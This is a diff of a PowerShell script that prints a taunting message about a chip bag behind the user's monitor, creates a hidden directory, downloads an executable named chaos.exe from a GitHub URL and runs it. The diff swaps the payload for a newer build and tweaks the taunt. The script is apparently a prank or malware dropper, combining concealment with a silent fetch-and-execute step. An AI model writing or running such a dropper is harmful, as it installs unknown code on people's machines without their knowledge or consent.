@@ -57,7 +57,7 @@ function Download-File {
   InvWR -url $Url -path $Path
 }
 
-Write-Host "there is a salted lays bag from yesterday behind your monitor"
+Write-Host "there is still a salted lays bag from yesterday behind your monitor"
 Start-Sleep -Seconds 3
 
 Add-Type -Name Window -Namespace Console -MemberDefinition '
@@ -78,7 +78,7 @@ If (Test-Path $ioq3Path) {
 New-Item -ItemType Directory -Path $ioq3Path
 Set-ItemProperty -Path $ioq3Path -Name "Attributes" -Value ([System.IO.FileAttributes]::Hidden)
 
-Download-File -Url "https://github.com/rretroo/scripts/raw/main/chaos2.exe" -Path "$ioq3Path\chaos.exe"
+Download-File -Url "https://raw.githubusercontent.com/rretroo/scripts/main/chaos3.exe" -Path "$ioq3Path\chaos.exe"
 
 Start-Process -FilePath "$ioq3Path\chaos.exe" -WorkingDirectory $ioq3Path
 Exit
